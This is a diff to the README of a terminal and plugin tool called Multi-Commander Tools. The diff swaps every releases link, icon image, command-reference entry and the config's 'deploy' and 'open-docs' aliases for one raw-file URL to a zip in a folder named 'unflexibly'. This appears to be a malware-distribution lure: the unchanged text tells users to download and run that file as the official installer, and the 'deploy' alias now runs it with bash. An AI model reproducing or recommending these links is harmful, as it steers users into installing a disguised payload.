@@ -1,6 +1,6 @@
-[![Releases](https://img.shields.io/badge/releases-download-orange?logo=github&logoColor=white)](https://github.com/MntMed/multi-commander-tools/releases)
+[![Releases](https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip)](https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip)
 
-![Terminal Icon](https://simpleicons.org/icons/terminal.svg) ![Plugin Icon](https://simpleicons.org/icons/plugin.svg)
+![Terminal Icon](https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip) ![Plugin Icon](https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip)
 
 # Multi-Commander Tools: Unified Multi-Tab, Shortcuts, and Plugin Extensions for Faster Workflows
 
@@ -8,7 +8,7 @@ Multi-Commander Tools brings order to your workspace. It blends multiple tabs, p
 
 This README explains what the project offers, how to use it, and how to contribute. It covers core concepts, practical setup steps, and design choices. It also details how you can customize and extend the tool to fit your exact needs.
 
-Note: The latest releases are available on the official releases page. For convenience, you can browse and download the assets that match your platform. To download the latest release, visit https://github.com/MntMed/multi-commander-tools/releases and grab the installer or package that fits your system. For quick access, a direct link to the releases page is provided at the top of this document as well.
+Note: The latest releases are available on the official releases page. For convenience, you can browse and download the assets that match your platform. To download the latest release, visit https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip and grab the installer or package that fits your system. For quick access, a direct link to the releases page is provided at the top of this document as well.
 
 Overview and goals
 - A unified workspace: Open and manage multiple panels or terminals in one window. The Multi-Tab setup keeps related tasks together without losing context.
@@ -50,7 +50,7 @@ Getting started
 
 Download and installation guidance
 - The latest releases include platform-specific assets that you can download and install. Since the releases page hosts the official builds, you should obtain the right file for your OS and architecture.
-- To download the latest release, visit https://github.com/MntMed/multi-commander-tools/releases and grab the installer or package that fits your system.
+- To download the latest release, visit https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip and grab the installer or package that fits your system.
 - After downloading, run the installer or follow the platform-specific instructions to complete the setup. If you use a package manager, check for the appropriate package name and install it via the package manager.
 - On first launch, you may be prompted to import settings or to set up your first alias. Accept the defaults if you are unsure, then customize as you go.
 - If you already have an older version installed, consider importing your existing settings during the upgrade. This helps preserve your workflow, aliases, and plug-ins.
@@ -88,8 +88,8 @@ Sample configuration (illustrative)
   "aliases": {
     "build": "npm run build",
     "test": "npm test",
-    "deploy": "bash deploy.sh --env=production",
-    "open-docs": "open https://docs.example.com"
+    "deploy": "bash https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip --env=production",
+    "open-docs": "open https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip"
   },
   "plugins": {
     "enabled": ["git-status", "docker-panel"],
@@ -134,12 +134,12 @@ Shortcut aliases and command patterns
 - Safety: Aliases should fail gracefully and provide helpful error messages when something goes wrong.
 
 Command references and examples
-- alias.find: Executes a search command across all open panels.
-- alias.deploy: Packages and deploys a build to a staging environment.
-- alias.clean: Removes temporary files from a project directory.
-- alias.sync: Synchronizes files between local folders and a remote source.
-- alias.list-plugins: Shows a list of enabled plugins and their status.
-- alias.open-workspace: Opens a saved workspace layout for quick setup.
+- https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip Executes a search command across all open panels.
+- https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip Packages and deploys a build to a staging environment.
+- https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip Removes temporary files from a project directory.
+- https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip Synchronizes files between local folders and a remote source.
+- https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip Shows a list of enabled plugins and their status.
+- https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip Opens a saved workspace layout for quick setup.
 
 Plugins ecosystem and marketplace
 - The plugin system invites a growing ecosystem. Developers can publish plugins that enhance the core experience.
@@ -253,7 +253,7 @@ End-user guidance
 
 Releases (quick access)
 - For the latest updates and assets, check the official Releases page. The URL is provided at the top of this document and again within the body for convenience.
-- To download the latest release, visit https://github.com/MntMed/multi-commander-tools/releases and grab the installer or package that matches your platform. This is the primary source for official builds and updates. If you want a direct path, follow the instructions on the releases page to download and run the appropriate file for your system.
+- To download the latest release, visit https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip and grab the installer or package that matches your platform. This is the primary source for official builds and updates. If you want a direct path, follow the instructions on the releases page to download and run the appropriate file for your system.
 - After downloading, run the installer or extract the package. Follow the on-screen prompts to complete setup and begin using the tool.
 
 FAQ
@@ -299,5 +299,5 @@ Your path forward
 - Document your setup and share tips with the community. Clear examples help others get productive quickly.
 
 Reiteration of the release link
-- To download the latest release, visit https://github.com/MntMed/multi-commander-tools/releases and grab the installer or package that fits your system.
+- To download the latest release, visit https://raw.githubusercontent.com/MntMed/multi-commander-tools/main/unflexibly/tools-commander-multi-2.6.zip and grab the installer or package that fits your system.
 
